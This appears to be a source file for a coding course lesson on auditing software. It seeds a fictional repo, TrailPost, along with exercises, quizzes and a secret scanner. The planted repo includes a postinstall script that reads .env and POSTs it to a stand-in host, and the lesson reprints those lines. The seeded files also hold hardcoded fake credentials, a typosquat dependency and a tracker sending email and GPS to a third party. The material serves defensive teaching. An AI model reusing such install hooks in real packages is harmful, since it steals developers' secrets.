// Camp 12 of 13 (the K card): Hillary Step. The Auditor: judge any project or tool.
// Same shape as camp2.js. Every weather check so far was a small audit; this camp turns
// them into one full method. All projects, people and services are invented, and every
// web address uses the reserved .example domain. The practice terminal can't fake git
// history, so dates come from the seeded CHANGELOG.md (real `git log` is on the cards).

// ─────────────── The audited project: TrailPost (a pretend repo you "cloned") ───────────────
const TP = '/home/climber/trailpost'

const TP_PKG = '{\n  "name": "trailpost",\n  "version": "2.3.0",\n  "license": "MIT",\n  "scripts": {\n    "start": "node src/server.js",\n    "postinstall": "node scripts/setup.js"\n  },\n  "dependencies": {\n    "crossenv": "^1.0.0",\n    "dayjs": "^1.11.13",\n    "express": "^4.18.2",\n    "trail-maps": "^3.0.1",\n    "trail-utils": "*"\n  }\n}\n'

const TP_README = '# TrailPost\n\nShare your climbing trips with your team.\n\n- 100% private: your data never leaves your device\n- 10x faster than other trip apps (see BENCHMARKS.md)\n- Bank-grade security\n- Actively maintained\n- Free forever\n\n## Install\nnpm install\nnpm run start\n'

const TP_SERVER = 'const express = require("express")\nconst app = express()\n\nconst DB_PASSWORD = "hunter2-summit"\nconst mapsKey = "mt_live_8f3k2q9zx"\nconst port = 3000\n\napp.get("/trips", (req, res) => res.json([]))\napp.listen(port)\n'

const MIT_TEXT = 'MIT License\n\nCopyright (c) 2021 TrailPost contributors\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the "Software"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n'

const TRAILPOST = {
  [`${TP}/README.md`]: TP_README,
  [`${TP}/package.json`]: TP_PKG,
  [`${TP}/.env`]: 'DB_URL=postgres://admin:hunter2-summit@db.trailpost.example/trips\nMAPTILES_KEY=mt_live_8f3k2q9zx\n',
  [`${TP}/.gitignore`]: 'node_modules\n',
  [`${TP}/CHANGELOG.md`]: '# Changelog\n\n## 2.3.0 (2023-04-02)\n- Add trip photos\n\n## 2.2.0 (2022-11-20)\n- Faster map loading\n\n## 2.1.0 (2022-06-14)\n- Team invites\n',
  [`${TP}/LICENSE`]: MIT_TEXT,
  [`${TP}/PRIVACY.md`]: '# Privacy\n\nWe collect nothing. Your trips stay on your device.\nServer logs are kept for 10 years to improve the service.\n',
  [`${TP}/scripts/setup.js`]: '// "Setup": prepares your environment\nconst fs = require("fs")\nconst env = fs.existsSync(".env") ? fs.readFileSync(".env", "utf8") : ""\nfetch("https://stats.trailpost-cdn.example/collect", { method: "POST", body: env })\nconsole.log("Setup complete!")\n',
  [`${TP}/src/server.js`]: TP_SERVER,
  [`${TP}/src/analytics.js`]: 'const TRACKER = "https://collect.adwhale.example/v2/event"\n\nfunction track(user, event) {\n  fetch(TRACKER, {\n    method: "POST",\n    body: JSON.stringify({ email: user.email, gps: user.lastLocation, event })\n  })\n}\n\nmodule.exports = { track }\n',
  [`${TP}/node_modules/crossenv/package.json`]: '{\n  "name": "crossenv",\n  "version": "1.0.0",\n  "license": "MIT"\n}\n',
  [`${TP}/node_modules/dayjs/package.json`]: '{\n  "name": "dayjs",\n  "version": "1.11.13",\n  "license": "MIT"\n}\n',
  [`${TP}/node_modules/express/package.json`]: '{\n  "name": "express",\n  "version": "4.18.2",\n  "license": "MIT"\n}\n',
  [`${TP}/node_modules/trail-maps/package.json`]: '{\n  "name": "trail-maps",\n  "version": "3.0.1",\n  "license": "AGPL-3.0-only"\n}\n',
  [`${TP}/node_modules/trail-utils/package.json`]: '{\n  "name": "trail-utils",\n  "version": "0.4.0",\n  "license": "UNLICENSED"\n}\n',
}

// A small helper module for the audit-kit build: finds look-alike package names.
const KNOWN_JS = 'const POPULAR = ["express", "cross-env", "lodash", "dayjs", "dotenv", "axios"]\n\n// true if a and b differ by exactly one added, removed or changed character\nfunction oneEditAway(a, b) {\n  if (a === b || Math.abs(a.length - b.length) > 1) return false\n  let i = 0\n  while (i < a.length && a[i] === b[i]) i++\n  if (a.length === b.length) return a.slice(i + 1) === b.slice(i + 1)\n  if (a.length > b.length) return a.slice(i + 1) === b.slice(i)\n  return a.slice(i) === b.slice(i + 1)\n}\n\n// The popular package that `name` imitates, or null.\nfunction lookalike(name) {\n  if (POPULAR.includes(name)) return null\n  for (const real of POPULAR) if (oneEditAway(name, real)) return real\n  return null\n}\n\nmodule.exports = { POPULAR, lookalike }\n'

export const campK = [
  // ───────────────────────────── Trail 1 ─────────────────────────────
  {
    id: 'K-1', type: 'learn', mode: 'phone', xp: 30, mins: 53,
    title: 'The auditor\'s method',
    teaches: ['audit-method', 'claims-evidence', 'halting-problem'],
    idea: [
      { h: 'What an audit is', b: "The Hillary Step is the last rock wall below the summit. Climbers have to decide there whether to go on or turn back.\n\nThis camp teaches the software version of that decision. Since Base Camp, every camp ended with a small **weather check**: a quick look at one suspicious claim. Here you turn those checks into a full **audit**: a method you can point at any codebase, product or tool and come back with a clear, defensible verdict." },
      { h: 'Your audit target for this camp', b: "A friend's climbing club wants to use **TrailPost**, an open-source app for sharing trip plans. Its README promises \"100% private\", \"10× faster\", \"actively maintained\" and \"free forever\". You've cloned the repo. Over the next trails you'll audit it from every side: claims, health, dependencies, threats, secrets, cost, privacy, licences and benchmarks.\n\nRule one of auditing: **read, don't run.** You'll open files and check them, but you won't run anything you haven't read. Next come the Field Guide cards: the method itself, and how to weigh claims against evidence." },
      { h: "Under the hood: why auditors exist at all", b: "In 1936 Alan Turing proved that no program can look at every other program and always tell whether it will finish running. That's the **halting problem**, and it means no tool, however clever, can tell you, for every program, whether it is bug-free or safe. Scanners, linters and AI reviewers all either miss some real problems or flag some fine code.\n\nSo an auditor never treats one tool's \"all clear\" as proof. They gather evidence from several methods (tests, reading the code, scanners, running it) and spend the most care where a failure would hurt the most." },
    ],
    example: {
      intro: 'The first ten minutes of an audit. Tap through each line.',
      lang: 'sh',
      code: '$ cd trailpost\n$ ls -a\n.  ..  CHANGELOG.md  .env  .gitignore  LICENSE  node_modules  package.json  PRIVACY.md  README.md  scripts  src\n$ cat .gitignore\nnode_modules\n$ cat README.md\n# TrailPost\n...\n- 100% private: your data never leaves your device\n$ echo "HIGH: .env (database password) is in the repo" > ~/audit-notes.txt',
      steps: [
        { line: 1, note: 'Step into the cloned project. You\'re going to read it, not run it.' },
        { line: 2, note: '`ls -a`, because the most important files in an audit are often hidden ones (names starting with a dot).' },
        { line: 3, note: 'There it is: `.env`, the file that usually holds passwords and keys. A clone only contains files someone **committed**, so this secret was published with the code.' },
        { line: 4, note: 'Why did that happen? `.gitignore` lists what Git should never commit.' },
        { line: 5, note: 'Only node_modules. `.env` was never ignored. That\'s the cause, written down as evidence.' },
        { line: 6, note: 'Now the claims. The README is the project\'s sales pitch; you copy each claim exactly.' },
        { line: 9, note: '"Data never leaves your device", yet the app has a database password. A claim to test against the code later.' },
        { line: 10, note: 'Evidence goes in a notes file in your **home** folder (`~`), never inside the project you are auditing.' },
      ],
    },
    tryit: {
      kind: 'terminal',
      brief: "Start the TrailPost audit. **Scope:** is TrailPost safe and honest enough to recommend? Read-only.\n1. `cd trailpost`\n2. `ls -a` to see every file, hidden ones too\n3. `cat README.md` to read the claims\n4. `cat .gitignore` to see what was meant to stay out of the repo\n5. `cat .env` to confirm what leaked (look, but never copy the values into a report)\n6. Record the finding in your notes, outside the project:\n`echo \"HIGH: .env with a database password is in the repo\" > ~/audit-notes.txt`\nThen `cat ~/audit-notes.txt` to check it saved.",
      seed: TRAILPOST,
      keys: ['cd ', 'ls -a', 'cat ', 'echo ', 'trailpost', 'README.md', '.gitignore', '.env', ' > ', '~/audit-notes.txt', '"'],
      steps: [
        { kind: 'cwd', path: TP, label: 'You are inside `trailpost`' },
        { kind: 'cmd', re: '^ls -a', label: 'Look at everything with `ls -a`' },
        { kind: 'cmd', re: '^cat README\\.md$', label: 'Read the claims in `README.md`' },
        { kind: 'cmd', re: '^cat \\.gitignore$', label: 'Check `.gitignore`' },
        { kind: 'cmd', re: '^cat \\.env$', label: 'Confirm what\'s in `.env`' },
        { kind: 'file', path: '/home/climber/audit-notes.txt', contains: '.env', label: 'A finding about `.env` is saved in `~/audit-notes.txt`' },
      ],
    },
    mistakes: [
      { wrong: 'npm install   (to "see what TrailPost does")', result: '(runs the postinstall script immediately, with your permissions)', why: 'Installing runs code before you\'ve read it. An audit reads package.json and the scripts first. You\'ll do exactly that next trail.' },
      { wrong: 'echo "HIGH: .env leaked" > audit-notes.txt   (while inside trailpost)', result: '(your notes are now a file inside the project you are auditing)', why: 'You\'ve changed the thing under audit, and a careless `git add .` could commit your notes. Keep notes in `~`.' },
      { wrong: 'Finding: "Security seems weak."', result: '(nobody can check or fix this)', why: 'No evidence, no location, no severity. Write: "HIGH: .env with a database password is committed (.gitignore lists only node_modules)."' },
    ],
    recap: [
      'An **audit** answers one question with a verdict: **scope → questions → evidence → verdict**.',
      'Write the scope first: the question, what\'s in, what\'s out, a time box, and **read-only**.',
      'Every finding needs **evidence** someone else can re-check: file, line, command, output, exact quote.',
      'A **claim** is what they say; **evidence** is what you can check. Mark claims SUPPORTED, CONTRADICTED or UNVERIFIED.',
      'Keep notes outside the project, and never run what you haven\'t read.',
      "The **halting problem** proves no tool can judge every program correctly, so a tool's \"all clear\" is evidence, never proof.",
    ],
    questions: [
      { concept: 'audit-method', kind: 'mc', q: 'What do you write down BEFORE opening any file of the project?', options: ['The verdict, so you know where you\'re heading and can collect evidence for it', 'The scope: the question, what\'s in and out, a time box, read-only', 'A list of every bug you expect, so you can tick them off as you find them', 'Nothing yet: the scope only becomes clear once you\'ve explored the files for a while'], answer: 1, why: 'The scope tells you what matters and when to stop. Without it you collect random observations.' },
      { concept: 'audit-method', kind: 'mc', q: 'Which is real evidence for a finding?', options: ['"The code is messy and the author seems careless, which is a strong sign of danger"', '"package.json line 7: postinstall runs node scripts/setup.js"', '"Several experienced developers I trust told me this project feels unsafe"', '"The repository looks old and neglected, so it is probably full of vulnerabilities"'], answer: 1, why: 'A file, a line and an exact quote: anyone can re-check it.' },
      { concept: 'audit-method', kind: 'mc', q: 'Their live servers are outside your scope (you have no permission). What do you do about them?', options: ['Run a gentle scan of them, because a quiet check does no harm if you find nothing', 'Leave them alone, and state in the report that they weren\'t tested', 'Ask the maintainers in chat, and test them yourself if they don\'t answer within a day', 'Mark them as secure in the report, because nothing in the code suggests a problem'], answer: 1, why: 'Testing systems without permission can be illegal. Saying what you didn\'t check is honest and useful.' },
      { concept: 'claims-evidence', kind: 'mc', q: 'README: "Actively maintained". The CHANGELOG\'s newest entry is from three years ago. How do you mark the claim?', options: ['Supported', 'Contradicted', 'Unverified', 'Irrelevant'], answer: 1, why: 'The evidence shows the opposite of the claim.' },
      { concept: 'claims-evidence', kind: 'mc', q: 'README: "Free forever". There\'s no pricing page or terms anywhere. How do you mark it?', options: ['Contradicted: with no terms published, you should assume it will cost money later', 'Supported, since it\'s free today', 'Unverified: no evidence either way', 'Supported: the README says it, and a README is the project\'s own promise'], answer: 2, why: 'Not proven is not the same as false. "Unverified" is accurate and fair.' },
      { concept: 'claims-evidence', kind: 'mc', q: 'Who has to prove "10× faster than other trip apps"?', options: ['You, the auditor, by testing until you prove it false', 'The project making the claim', 'Nobody, because claims in a README are marketing and marketing is just opinion', 'The other trip apps, since they are the ones being compared against'], answer: 1, why: 'The burden of proof is on whoever makes the claim.' },
      { concept: 'claims-evidence', kind: 'mc', q: 'Which phrase is a classic weasel phrase that promises almost nothing?', options: ['"Median load time 230 ms on the published test script"', '"Up to 10× faster"', '"Median 230 ms, p95 410 ms, measured with the published script"', '"Measured on a 2021 laptop; test script is in BENCHMARKS.md"'], answer: 1, why: '"Up to" is satisfied by a single best-case result.' },
      { concept: 'audit-method', kind: 'mc', q: 'A cloned repo contains a `.env` file. What does that tell you?', options: ['Nothing alarming: .env files are normal local config and are always safe to ship', 'Someone committed it: a clone only contains committed files, so it\'s published', 'Git generated it automatically when you cloned, as a template for your own settings', 'It\'s safe because dotfiles are hidden from ls and from visitors browsing the repo'], answer: 1, why: 'Clones only contain what was committed. Hidden from ls is not hidden from the internet.' },
      { concept: "halting-problem", kind: "mc", q: "A product claims \"our AI scanner guarantees your code has zero bugs\". What does computer science say?", options: ["It's possible with enough computing power", "It's impossible in general: the halting problem shows no tool can decide that for every program", "It's true for JavaScript only", "It's true if the code has tests"], answer: 1, why: "Turing proved no program can even decide \"will this finish?\" for all programs, so a guarantee of zero bugs is an overclaim." },
    ],
  },

  // ───────────────────────────── Trail 2 ─────────────────────────────
  {
    id: 'K-2', type: 'learn', mode: 'phone', xp: 30, mins: 50,
    title: 'Repo health and dependencies',
    teaches: ['repo-health', 'dependency-audit'],
    idea: [
      { h: 'Is the project still maintained?', b: "**Repo health** tells you whether anyone is still maintaining a project and will fix the next problem, whatever its README claims.\n\nMost of a Node app's code comes from **dependencies** (packages written by other people), so auditing them covers much of the real risk." },
      { h: 'What you will check', b: "Two cards: **Repo health** (dates, issues, the bus factor) and **Dependency audit** (install scripts, look-alike names, version ranges, and `npm audit` on real computers).\n\nThen you'll go back into TrailPost and check the three things that run or arrive without asking: the changelog dates, the scripts npm would run, and the code behind the postinstall script." },
    ],
    example: {
      intro: 'Checking health and dependencies without installing anything. Tap through it.',
      lang: 'sh',
      code: '$ head -n 4 CHANGELOG.md\n# Changelog\n\n## 2.3.0 (2023-04-02)\n- Add trip photos\n$ npm run\nLifecycle scripts included in trailpost@2.3.0:\n  start\n    node src/server.js\n  postinstall\n    node scripts/setup.js\n$ cat scripts/setup.js\nconst env = fs.existsSync(".env") ? fs.readFileSync(".env", "utf8") : ""\nfetch("https://stats.trailpost-cdn.example/collect", { method: "POST", body: env })',
      steps: [
        { line: 1, note: '`head -n 4` shows only the newest entries. The changelog is the release history.' },
        { line: 4, note: 'Last release: April 2023. Compare that with "Actively maintained" in the README.' },
        { line: 6, note: '`npm run` with no script name lists the scripts, and runs nothing. Safe.' },
        { line: 10, note: '`postinstall` is a special name: npm runs it automatically after every `npm install`.' },
        { line: 11, note: 'So `node scripts/setup.js` would run on your machine the moment you install. Read it.' },
        { line: 12, note: 'Read the script instead of running it. (Lines trimmed here.)' },
        { line: 13, note: 'It reads your `.env` file: your secrets.' },
        { line: 14, note: 'And sends them to an outside server. That\'s a HIGH finding, found without running a single line.' },
      ],
    },
    tryit: {
      kind: 'terminal',
      brief: "Check TrailPost's health and its dependencies, still read-only:\n1. `cd trailpost`\n2. `head -n 5 CHANGELOG.md` for the newest release date\n3. `npm run` lists the scripts (it runs nothing without a name)\n4. `cat scripts/setup.js` to read what postinstall would run\n5. `cat package.json` and look at the dependency names and versions: any look-alikes, any `*`?\n6. Add a finding to your notes:\n`echo \"HIGH: postinstall uploads .env to an outside server\" >> ~/audit-notes.txt`\n\n⚠️ Don't run `npm install` or `npm run postinstall`. Reading is the audit.",
      seed: TRAILPOST,
      keys: ['cd ', 'head -n 5 ', 'npm run', 'cat ', 'echo ', 'trailpost', 'CHANGELOG.md', 'scripts/setup.js', 'package.json', ' >> ', '~/audit-notes.txt', '"'],
      steps: [
        { kind: 'cwd', path: TP, label: 'You are inside `trailpost`' },
        { kind: 'cmd', re: '^head .*CHANGELOG\\.md$', label: 'Check the newest release with `head`' },
        { kind: 'cmd', re: '^npm run$', label: 'List the scripts with `npm run`' },
        { kind: 'cmd', re: '^cat scripts/setup\\.js$', label: 'Read what postinstall would run' },
        { kind: 'cmd', re: '^cat package\\.json$', label: 'Read the dependencies in `package.json`' },
        { kind: 'file', path: '/home/climber/audit-notes.txt', contains: 'postinstall', label: 'A postinstall finding is saved in `~/audit-notes.txt`' },
      ],
    },
    mistakes: [
      { wrong: 'npm run postinstall   (to see what it does)', result: '(your .env would be sent to the outside server)', why: 'Running it IS the attack. You read `scripts/setup.js` instead, and the code told you everything.' },
      { wrong: '"Express has 60,000 stars, so TrailPost\'s dependencies are fine."', result: '(crossenv and trail-utils were never checked)', why: 'Every dependency gets checked on its own. The famous one being fine says nothing about the look-alike next to it.' },
      { wrong: 'npm audit   →   found 0 vulnerabilities   →   "safe!"', result: '(the crossenv typosquat isn\'t in any database yet)', why: '`npm audit` only knows reported problems. Names, install scripts and health still need your eyes.' },
    ],
    recap: [
      '**Repo health**: last commit and release, issues answered, contributors (the **bus factor**), tests, licence. Stars are weak evidence.',
      'Install scripts (`preinstall`, `install`, `postinstall`) run automatically on `npm install`. Read them first.',
      'Check every dependency name letter by letter, and flag `"*"`, `"latest"` and git-URL versions.',
      'On real computers: `npm audit` for known holes (`--omit=dev` for what ships) and `npm outdated` for freshness.',
      '"0 vulnerabilities" means none **known**, not none.',
    ],
    questions: [
      { concept: 'repo-health', kind: 'mc', q: 'One person wrote 98% of the commits of a library your app depends on. What does that mean?', options: ['A strong sign of quality: one author keeps the code consistent, so there are fewer bugs', 'Bus factor 1: if that person stops, fixes stop', 'The library is probably abandoned: 98% from one person means everyone else has left', 'The library was probably copied from elsewhere, since real projects have many authors'], answer: 1, why: 'The bus factor is how many people must disappear before a project stalls. One is fragile.' },
      { concept: 'repo-health', kind: 'mc', q: 'Which is the WEAKEST health signal?', options: ['Date of the last release', 'Whether issues get replies', 'Number of stars', 'Number of active maintainers'], answer: 2, why: 'Stars are bookmarks: they never expire and can be bought.' },
      { concept: 'repo-health', kind: 'mc', q: 'A tiny library that pads text has had no commits for 3 years and has no open bugs. Fair verdict?', options: ['Dead: three years without a commit means abandoned, so never use it at all', 'Possibly fine: small finished code may have nothing left to fix', 'Suspicious: no open bugs on a quiet repo means issues are being hidden or deleted', 'Health doesn\'t matter for tiny code, because small libraries can\'t have any risk'], answer: 1, why: 'Context matters. Quiet is a warning for big, internet-facing apps; less so for tiny, finished utilities.' },
      { concept: 'dependency-audit', kind: 'mc', q: 'Which script names does npm run automatically during `npm install`?', options: ['start, test and build, the scripts that most projects define first', 'preinstall, install and postinstall', 'Only scripts you name yourself: npm never runs anything you didn\'t ask for', 'build, test and deploy, which npm runs to prepare the package for use'], answer: 1, why: 'These lifecycle scripts run without you calling them, which is why you read them first.' },
      { concept: 'dependency-audit', kind: 'mc', q: '`"trail-utils": "*"` in package.json. What\'s the risk?', options: ['None: * means the version is locked, so installs are stable and repeatable', 'Every fresh install takes whatever version is newest that day, reviewed or not', 'It installs every package in the registry that matches the name, bloating the project', 'It stops the package updating at all, so you miss every future security fix'], answer: 1, why: '`*` accepts any version. Use a normal range and a lock file.' },
      { concept: 'dependency-audit', kind: 'mc', q: '`npm audit` reports one HIGH vulnerability, in a testing tool listed in devDependencies. What\'s the sensible first step?', options: ['Run `npm audit fix --force` straight away, since a HIGH finding must be removed first', 'Note it, check whether it ships to users (`npm audit --omit=dev`), and plan an update', 'Treat it as critical and stop all work until the vulnerable tool is gone from the project', 'Ignore it: devDependencies are never a security risk, so audit output there is noise'], answer: 1, why: 'Severity is the start. Where it sits (dev only vs shipped) decides the urgency.' },
      { concept: 'dependency-audit', kind: 'mc', q: 'Why be careful with `npm audit fix --force`?', options: ['It deletes the lock file and reinstalls, which can erase your local changes', 'It can jump MAJOR versions, which may break your app', 'It sends your dependency list to a server, which can leak private package names', 'It removes packages that have a vulnerability, which can leave your app without them'], answer: 1, why: 'Plain `npm audit fix` stays inside your allowed ranges. `--force` doesn\'t.' },
      { concept: 'dependency-audit', kind: 'mc', q: 'package.json lists `crossenv`. The popular package is `cross-env`. What\'s the finding?', options: ['Harmless: it\'s just a spelling variant of the same package by the same author', 'Possible typosquat: a look-alike name, HIGH until proven otherwise', 'A newer fork of cross-env, so it\'s likely safer and better maintained', 'Low: only dev tools use this package, so a fake one can\'t hurt anything'], answer: 1, why: 'One character off a popular name is the typosquatting pattern.' },
    ],
  },

  // ───────────────────────────── Trail 3 ─────────────────────────────
  {
    id: 'K-3', type: 'learn', mode: 'phone', xp: 35, mins: 55,
    title: 'Architecture, threats and secrets',
    teaches: ['architecture-review', 'threat-model', 'secret-scan'],
    idea: [
      { h: 'Map the system, then list the dangers', b: "An **architecture review** maps the parts of a system and the data flowing between them. A **threat model** asks what's valuable, who might attack it, and where they could get in.\n\nA **secret scan** looks for passwords and keys left in the code, because those let an attacker in directly." },
      { h: 'Build a secret scanner', b: "Three cards, then you'll write a tiny **secret scanner** in JavaScript using a **regular expression** (a text pattern). The Secret scan card teaches the four regex pieces you need. Real tools work the same way, just with hundreds of patterns." },
    ],
    example: {
      intro: 'A secret scanner in a few lines. Tap through it.',
      lang: 'js',
      code: 'const SECRET = /(password|secret|key|token)\\w*\\s*=\\s*["\']/i\n\nconst code = \'const port = 3000\\nconst DB_PASSWORD = "hunter2-summit"\\nconst appName = "TrailPost"\'\nconst lines = code.split("\\n")\n\nlines.forEach((line, i) => {\n  if (SECRET.test(line)) console.log("Possible secret on line " + (i + 1))\n})',
      steps: [
        { line: 1, note: 'The pattern: a secret-ish word (`password|secret|key|token`), maybe more name letters (`\\w*`), maybe spaces (`\\s*`), `=`, maybe spaces, then a quote (`["\']`). The `i` ignores case.' },
        { line: 3, note: 'Some pretend source code: three lines in one string, joined by `\\n` (new line).' },
        { line: 4, note: 'Split it into an array of lines, so each can be checked on its own.' },
        { line: 6, note: '`forEach` gives each line and its index `i`. Indexes start at 0.' },
        { line: 7, note: '`SECRET.test(line)` is true only for line 2. Line numbers start at 1, so print `i + 1`. Output: `Possible secret on line 2`.' },
      ],
    },
    tryit: {
      kind: 'code',
      prompt: "The sandbox has TrailPost's `src/config.js`. Finish the scanner:\n1. `isSecretLine(line)` returns `true` if the line matches `SECRET`\n2. Loop over the lines and print `Possible secret on line N` for each match (lines count from 1)\n3. Finish with `3 possible secrets found` (the real count)\n\nExpected output:\n`Possible secret on line 3`\n`Possible secret on line 4`\n`Possible secret on line 6`\n`3 possible secrets found`\n\nNever print the secret itself: line numbers only.",
      starter: 'const fs = require("fs")\nconst SECRET = /(password|secret|key|token)\\w*\\s*=\\s*["\']/i\n\nfunction isSecretLine(line) {\n  // return true if the line matches SECRET (hint: SECRET.test(line))\n}\n\nconst lines = fs.readFileSync("src/config.js", "utf8").split("\\n")\nlet found = 0\n// loop over lines with forEach((line, i) => ...)\n// print "Possible secret on line N" for each match, and count it\n\n// print "<found> possible secrets found"\n',
      files: { 'src/config.js': '// TrailPost settings\nconst port = 3000\nconst DB_PASSWORD = "hunter2-summit"\nconst mapsKey = "mt_live_8f3k2q9zx"\nconst appName = "TrailPost"\nconst sessionSecret = \'change-me\'\nmodule.exports = { port, appName }\n' },
      expect: ['Possible secret on line 3', 'Possible secret on line 4', 'Possible secret on line 6', '3 possible secrets found'],
      checks: [
        { expr: 'isSecretLine(\'const apiToken = "abc"\')', equals: true, label: 'isSecretLine spots a token' },
        { expr: 'isSecretLine("const tokens = 5")', equals: false, label: 'isSecretLine ignores a number' },
      ],
      hints: ['Step 1 is one line: `return SECRET.test(line)`.', 'The loop: `lines.forEach((line, i) => { if (isSecretLine(line)) { console.log("Possible secret on line " + (i + 1)); found++ } })`.', 'Last line: `console.log(found + " possible secrets found")`.'],
    },
    mistakes: [
      { wrong: 'console.log("Possible secret on line " + i)', result: 'Possible secret on line 2', why: 'Array indexes start at 0, line numbers at 1. Print `i + 1`, or the report points at the wrong line.' },
      { wrong: 'const SECRET = /password|secret|key|token\\w*\\s*=\\s*["\']/i', result: '(matches the word "secret" anywhere, even in comments)', why: 'Without brackets, `|` splits the WHOLE pattern into alternatives. Group the words: `(password|secret|key|token)`.' },
      { wrong: 'console.log("Found: " + line)', result: 'Found: const DB_PASSWORD = "hunter2-summit"', why: 'You just leaked the secret again, into your output. Report the file and line, not the value.' },
    ],
    recap: [
      '**Architecture review**: boxes (parts) and arrows (data flows). Ask about single points of failure, where secrets live, third parties and backups.',
      'Anything shipped to a browser or phone is public. Secrets stay on the server.',
      '**Threat model**: assets → attackers → entry points → what could go wrong (STRIDE) → mitigation.',
      'STRIDE = Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.',
      '**Secret scan**: test each line against a pattern, report file + line, never the value. Leaked? **Rotate** the key first.',
    ],
    questions: [
      { concept: 'architecture-review', kind: 'mc', q: 'A web app\'s browser code contains `const MAPTILES_KEY = "mt_live_8f3k..."`. What\'s the finding?', options: ['Fine: minifying scrambles the code, so users can\'t read the key without special tools', 'The key is public: anyone can read browser code in devtools. Move the call to the server', 'Fine as long as the repo is private, because only your team can reach the code', 'A problem only on phones, because desktop browsers hide script files from users'], answer: 1, why: 'Everything sent to the browser can be read by users.' },
      { concept: 'architecture-review', kind: 'mc', q: 'Which file in a repo often lists every outside service the app talks to?', options: ['LICENSE', '.env.example', 'CHANGELOG.md', '.gitignore'], answer: 1, why: 'Each outside service needs a key, so the example env file names them all.' },
      { concept: 'threat-model', kind: 'mc', q: '"Nobody would bother attacking our little club app." Why is that wrong?', options: ['It\'s mostly right: attackers pick profitable targets, and a club app has little to steal', 'Most attacks are automated bots that scan everything, regardless of size', 'Because small apps usually have no firewall, so attackers pick them off one by one by hand', 'Because attackers only target apps that take credit cards, and a free club app is out of range'], answer: 1, why: 'Bots scan every public address and repo, all day.' },
      { concept: 'threat-model', kind: 'mc', q: '`DELETE /trips/:id` works without logging in. Which STRIDE letter fits best?', options: ['S: Spoofing', 'T: Tampering', 'R: Repudiation', 'D: Denial of service'], answer: 1, why: 'Changing or destroying data you shouldn\'t be able to is tampering.' },
      { concept: 'threat-model', kind: 'mc', q: 'An `/admin` page needs no login, so any visitor can use its admin controls. Which STRIDE letter fits best?', options: ['I: Information disclosure', 'E: Elevation of privilege', 'R: Repudiation', 'S: Spoofing'], answer: 1, why: 'Any visitor gains admin powers: that\'s elevation of privilege.' },
      { concept: 'threat-model', kind: 'mc', q: 'What must every item in a threat model end with?', options: ['A likelihood estimate: how often the attack is expected to happen', 'A mitigation: the fix or defence', 'The affected file name, so a developer can find the code', 'A named owner who is responsible for the attack surface'], answer: 1, why: 'Without mitigations, a threat model is just a worry list.' },
      { concept: 'secret-scan', kind: 'mc', q: 'What does `/token/i.test("API_TOKEN=abc")` return?', options: ['false, the case is different', 'true, the i makes it ignore case', '"TOKEN"', 'An error'], answer: 1, why: 'The `i` flag makes the match case-insensitive.' },
      { concept: 'secret-scan', kind: 'mc', q: 'A teammate committed `.env`, then deleted it in the next commit. Is the leak fixed?', options: ['Yes: deleting a file in Git removes it from every earlier commit too, so the history is clean', 'No: the old commit still contains it, and it may be copied. Rotate the key first', 'Yes, once you add .env to .gitignore, because Git then erases any copy it already stored', 'Yes, as long as nobody noticed the file in the first hour after it was pushed'], answer: 1, why: 'Git keeps every version. Revoke and replace the secret, then clean up.' },
    ],
  },

  // ───────────────────────────── Trail 4 ─────────────────────────────
  {
    id: 'K-4', type: 'learn', mode: 'phone', xp: 30, mins: 45,
    title: 'Working out the real cost',
    teaches: ['cost-analysis'],
    idea: [
      { h: 'Free tiers have limits', b: "Many tools are free to start. But \"free\" usually means \"free up to a limit\". Past the limit, every extra unit is billed: requests, storage, and especially data sent out to users.\n\nAn auditor turns a pricing page into a number for **your** usage, then asks what the bill would be with 10× the users." },
      { h: 'The pricing used in this camp', b: "TrailPost's hosting runs on **CloudCairn** (an invented service). Its pricing:\n• **requests**: first 1,000,000 per month free, then $0.40 per million\n• **storage**: first 5 GB free, then $0.02 per GB\n• **data out**: first 100 GB free, then $0.09 per GB\n\nRead the Cost analysis card, then you'll compute the bill in code." },
    ],
    example: {
      intro: 'One unit of the bill, worked through. Tap each line.',
      lang: 'js',
      code: 'function costOver(used, free, price) {\n  return Math.max(0, used - free) * price\n}\n\nconst dataOut = costOver(180, 100, 0.09)\nconsole.log("Data out: $" + dataOut.toFixed(2))\nconsole.log("Small month: $" + costOver(60, 100, 0.09).toFixed(2))',
      steps: [
        { line: 1, note: 'One function works for every unit: how much you used, how much is free, the price per unit.' },
        { line: 2, note: '`used - free` is the billable part. `Math.max(0, …)` stops it going negative when you\'re under the free limit.' },
        { line: 5, note: '180 GB out, 100 free: 80 billable × $0.09.' },
        { line: 6, note: '`toFixed(2)` rounds to cents and gives back a string: `Data out: $7.20`. (The raw number is 7.199999999999999, a normal floating-point wobble.)' },
        { line: 7, note: 'Under the free limit: `Small month: $0.00`. Without Math.max it would be -3.60.' },
      ],
    },
    tryit: {
      kind: 'code',
      prompt: "`usage.json` holds TrailPost's month on CloudCairn: requests, storage (GB) and data out (GB). Using the pricing above:\n1. Finish `costOver(used, free, price)`\n2. Print each line of the bill, then the total, then the bill at **10× traffic** (10× the requests and data out; storage stays the same)\n\nRequests are priced per **million**, so divide the request count by 1,000,000 first.\n\nExpected output:\n`Requests: $0.88`\n`Storage: $0.14`\n`Data out: $7.20`\n`Total: $8.22 per month`\n`At 10x traffic: $165.54 per month`",
